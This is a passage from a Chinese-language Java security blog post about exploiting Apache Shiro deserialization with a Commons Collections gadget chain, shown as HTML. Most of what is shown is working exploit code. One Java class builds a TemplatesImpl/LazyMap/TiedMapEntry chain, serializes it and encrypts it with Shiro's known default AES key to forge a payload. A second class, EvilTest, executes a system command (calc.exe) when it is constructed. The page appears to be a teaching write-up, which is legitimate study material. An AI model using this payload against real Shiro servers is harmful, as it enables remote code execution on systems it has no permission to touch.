+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">attack2</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass clazzz <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;EvilTest&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> clazzz.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>        TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{code});
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// faketransformer防止构造时触发</span>
+</span></span><span style="display:flex;"><span>        Transformer faketransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getClass&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// CC6pro</span>
+</span></span><span style="display:flex;"><span>        Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        Map outerMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, faketransformer);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// key传入恶意TemplatesImpl对象</span>
+</span></span><span style="display:flex;"><span>        TiedMapEntry tme <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(outerMap,obj);
+</span></span><span style="display:flex;"><span>        HashMap expMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        expMap.<span style="color:#a6e22e">put</span>(tme,<span style="color:#e6db74">&#34;value&#34;</span>);
+</span></span><span style="display:flex;"><span>        outerMap.<span style="color:#a6e22e">clear</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//将faketransformer改造，iMethodName换成newTransformer触发链子</span>
+</span></span><span style="display:flex;"><span>        setFieldValue(faketransformer, <span style="color:#e6db74">&#34;iMethodName&#34;</span>, <span style="color:#e6db74">&#34;newTransformer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 生成序列化字符串</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(barr);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(expMap);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// shiro数据生成</span>
+</span></span><span style="display:flex;"><span>        AesCipherService aes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AesCipherService();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> key <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
+</span></span><span style="display:flex;"><span>        ByteSource ciphertext <span style="color:#f92672">=</span> aes.<span style="color:#a6e22e">encrypt</span>(barr.<span style="color:#a6e22e">toByteArray</span>(), key);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">printf</span>(ciphertext.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最后我们再写个类去生成字节码去给TemplatesImpl加载</p>
+<p>再写一个恶意类，因为是要放入TemplatesImpl加载，所以得继承AbstractTranslet</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EvilTest</span> <span style="color:#66d9ef">extends</span> AbstractTranslet {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, SerializationHandler<span style="color:#f92672">[]</span> handlers) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#66d9ef">throws</span> TransletException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">EvilTest</span>() <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>();
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><!-- raw HTML omitted -->
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" data-title="java安全 Shiro反序列化利用CC链" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" data-title="java安全 Shiro反序列化利用CC链"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" data-title="java安全 Shiro反序列化利用CC链"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" data-title="java安全 Shiro反序列化利用CC链"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc3%E9%93%BE/" class="prev" rel="prev" title="java安全 CC3链"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>java安全 CC3链</a>
+            <a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" class="next" rel="next" title="java安全 CC2链">java安全 CC2链<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
